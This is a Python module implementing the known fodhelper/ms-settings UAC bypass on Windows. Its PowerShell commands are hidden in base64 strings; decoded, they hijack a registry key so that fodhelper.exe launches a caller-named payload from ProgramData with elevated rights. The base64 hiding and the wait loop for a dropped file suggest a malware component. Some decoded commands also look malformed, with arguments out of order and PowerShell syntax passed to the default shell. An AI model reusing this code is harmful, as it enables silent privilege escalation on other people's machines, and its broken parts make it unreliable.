# Most likely patched.


import subprocess
import ctypes
import sys
import base64
from time import sleep
import os
def d(x):
    return base64.b64decode(x).decode('utf-8')

def UACbypass(method: int = 1, n = "") -> bool:
    if GetSelf()[1]:
        e = lambda c: subprocess.run(c, shell= True, capture_output= True)
        e(d('T3V0LU51bGwgfCAtRm9yY2UgIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtUGF0aCBOZXctSXRlbQ=='))
        e(d('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTogXFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtTmFtZSAiRGVsZWdhdGVFeGVjdXRlIiAtUHJvcGVydHlUeXBlIFN0cmluZyAtRm9yY2UgfCBPdXQtTnVsbA=='))
        e(d('U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTogXFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtTmFtZSAiKERlZmF1bHQpIiAtVmFsdWUgIiRlbnY6UFJPR1JBTURBVEFc') + n + d('IiAtRm9yY2U='))
        sleep(1)
        if not os.path.isfile(f"{os.environ['USERPROFILE']}\\{n}"):
            print("waiting for proc to rep")
            while True:
                sleep(1)
                if os.path.isfile(f"{os.environ['USERPROFILE']}\\{n}"):
                    print("proc rep")
                    break
        e(d('U3RhcnQtUHJvY2VzcyAiZm9kaGVscGVyLmV4ZSI='))
        #e(d('UmVtb3ZlLUl0ZW0gIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MiIC1SZWN1cnNlIC1Gb3JjZQ=='))
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)